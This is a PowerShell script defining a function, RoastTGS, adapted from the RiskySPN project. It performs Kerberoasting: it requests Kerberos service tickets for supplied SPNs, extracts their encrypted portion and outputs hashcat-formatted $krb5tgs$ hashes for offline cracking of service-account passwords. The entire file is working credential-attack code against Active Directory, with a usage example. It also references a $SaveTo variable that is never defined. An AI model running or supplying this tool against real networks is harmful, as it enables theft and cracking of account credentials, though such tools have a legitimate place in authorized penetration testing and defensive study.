function RoastTGS
{
    <#
    .SYNOPSIS
        Requests Kerberos TGS (service ticket) for SPN(s) and retrieves the encrypted portion of the ticket(s). 

    .DESCRIPTION
        Modified version of https://github.com/machosec/RiskySPN/blob/master/Get-TGSCipher.ps1
        This does not query LDAP and requires that the SPN provided is correct or it will fail

    .PARAMETER SPN
        The name of the Service Principal Name for which to ask for Kerberos TGS. Must be correct and will not be checked for validity 

    .EXAMPLE 
        RoastTGS -SPN "http/server01.testlab.local"
 
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [Array]$SPN
    )

    Begin
    {
        Add-Type -AssemblyName System.IdentityModel
        $CrackList = @()        
        Write-Verbose "Starting to request SPN"
    }
    Process
    {
        $TargetAccount = "N/A"
        Write-Verbose "Asking for TGS for the SPN: $SPN"
        $ByteStream = $null
        try
        {
            #requesting TGS (service ticket) for the target SPN
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
            $ByteStream = $Ticket.GetRequest()
        }
        catch
        {
            Write-Warning "Could not request TGS for the SPN: $SPN"
            Write-Verbose "Make sure the SPN: $SPN is mapped on Active Directory" 
        }
        if ($ByteStream)
        {
            #converting byte array to hex string
            $HexStream = [System.BitConverter]::ToString($ByteStream) -replace "-"
            #extracting and conveting the hex value of the cipher's etype to decimal
            $eType =  [Convert]::ToInt32(($HexStream -replace ".*A0030201")[0..1] -join "", 16)
            #determing encryption type by etype - https://tools.ietf.org/html/rfc3961 
            $EncType = switch ($eType)
            {
                1       {"DES-CBC-CRC (1)"}
                3       {"DES-CBC-MD5 (3)"}
                17      {"AES128-CTS-HMAC-SHA-1 (17)"}
                18      {"AES256-CTS-HMAC-SHA-1 (18)"}
                23      {"RC4-HMAC (23)"}
                default {"Unknown ($eType)"}
            }
            #extracting the EncPart portion of the TGS
            $EncPart = $HexStream -replace ".*048204.." -replace "A48201.*"
            $Target = New-Object psobject -Property @{
                SPN            = $SPN
                Target         = $TargetAccount
                EncryptionType = $EncType
                EncTicketPart  = $EncPart  
            } | Select-Object SPN,Target,EncryptionType,EncTicketPart
            $CrackList += $Target    
        }
    }
    End 
    {
        if (!$CrackList.EncTicketPart)
        {
            Write-Error "Could not retrieve any tickets!"
            return
        }
        
        $Output = @()
        Write-Verbose "Converting to hashcat format"
        foreach ($Object in $CrackList)
        {
            if ($Object.EncryptionType -eq "RC4-HMAC (23)")
            {
                Write-Host "Got RC4 ticket"
                $Output += "`$krb5tgs`$23`$" + $Object.EncTicketPart.Substring(0,32) + "`$" + $Object.EncTicketPart.Substring(32)
            }
            elseif ($Object.EncryptionType -eq "AES128-CTS-HMAC-SHA-1 (17)"){
                Write-Host "Got AES128 ticket"
                $Output += "`$krb5tgs`$17`$" + $Object.EncTicketPart.Substring(0,32) + "`$" + $Object.EncTicketPart.Substring(32)
            }elseif($Object.EncryptionType -eq "AES256-CTS-HMAC-SHA-1 (18)"){
                Write-Host "Got AES256 ticket"
                $Output += "`$krb5tgs`$18`$" + $Object.EncTicketPart.Substring(0,32) + "`$" + $Object.EncTicketPart.Substring(32)
            }else{
                Write-Warning "Encryption Type of ticket was not RC4, AES128 or AES256. This is not handled by script!"
            }
        }
        if ($SaveTo)
        {
            $Output | Out-File $SaveTo -Encoding utf8
            Write-Verbose "File saved in: $SaveTo" 
        }
        else
        {
           return $Output 
        }
    }
}
